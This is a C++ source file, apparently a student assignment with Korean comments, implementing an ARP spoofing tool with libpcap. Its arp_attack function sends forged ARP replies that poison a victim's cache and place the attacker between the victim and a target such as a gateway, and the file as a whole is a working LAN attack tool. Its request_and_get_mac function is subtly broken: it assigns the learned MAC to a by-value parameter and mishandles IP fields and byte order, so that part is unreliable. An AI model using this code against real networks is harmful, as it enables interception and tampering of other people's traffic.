#include "spoof.h"
#include "hdr/etharppacket.h"

void usage() {
	printf("syntax: arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
}

bool request_and_get_mac(pcap_t* pcap, Mac myMac, Ip myIp, Ip receiverIp, Mac receiverMac) {
    EthArpPacket packet;

    packet.ethHdr_.dmac_ = receiverMac;
    packet.ethHdr_.smac_ = myMac;
    packet.ethHdr_.type_ = htons(EthHdr::ARP);

    packet.arpHdr_.hrd_ = htons(ArpHdr::ETHERNET);
    packet.arpHdr_.pro_ = htons(EthHdr::IP4);
    packet.arpHdr_.hlen_ = Mac::SIZE;
    packet.arpHdr_.plen_ = Ip::SIZE;
    packet.arpHdr_.op_ = htons(ArpHdr::REQUEST);
    packet.arpHdr_.smac_ = myMac;
    packet.arpHdr_.sip_ = htonl(static_cast<uint32_t>(receiverIp));
    packet.arpHdr_.tmac_ = receiverMac;
    packet.arpHdr_.tip_ = htonl(static_cast<uint32_t>(receiverIp)); 


    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "[Error] request sender mac packet return %d error=%s\n", res, pcap_geterr(pcap));
    }
    printf("ARP REQUEST packet from %s to %s\n", std::string(myIp).c_str(), std::string(receiverIp).c_str());

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;
        if (res < 0) return false;

        // 1. ARP 패킷인지 확인
        struct EthHdr* eth_hdr = (struct EthHdr*)packet;
        if (ntohs(eth_hdr->type_) != EthHdr::ARP) {
            printf("(Not an ARP packet, skipping.)\n");
            continue; 
        }

        struct ArpHdr* arp_hdr = (struct ArpHdr*)(packet + sizeof(EthHdr));

        // 2. 내가 찾던 ARP Reply인지 확인
        if (ntohs(arp_hdr->op_) == ArpHdr::REPLY && arp_hdr->sip_ == receiverIp) {
            receiverMac = arp_hdr->smac_;
            return true; 
        }
    }
    return false;
}

void arp_attack(pcap_t* handle, const Mac& sender_mac, const Ip& sender_ip, const Ip& target_ip, const Mac& my_mac) {
    EthArpPacket packet;

    packet.ethHdr_.dmac_ = sender_mac;
    packet.ethHdr_.smac_ = my_mac;
    packet.ethHdr_.type_ = htons(EthHdr::ARP);

    packet.arpHdr_.hrd_ = htons(ArpHdr::ETHERNET);
    packet.arpHdr_.pro_ = htons(EthHdr::IP4);
    packet.arpHdr_.hlen_ = Mac::SIZE;
    packet.arpHdr_.plen_ = Ip::SIZE;
    packet.arpHdr_.op_ = htons(ArpHdr::REPLY);
    packet.arpHdr_.smac_ = my_mac;
    packet.arpHdr_.sip_ = htonl(static_cast<uint32_t>(target_ip));
    packet.arpHdr_.tmac_ = sender_mac;
    packet.arpHdr_.tip_ = htonl(static_cast<uint32_t>(sender_ip)); 

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "[Error] pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}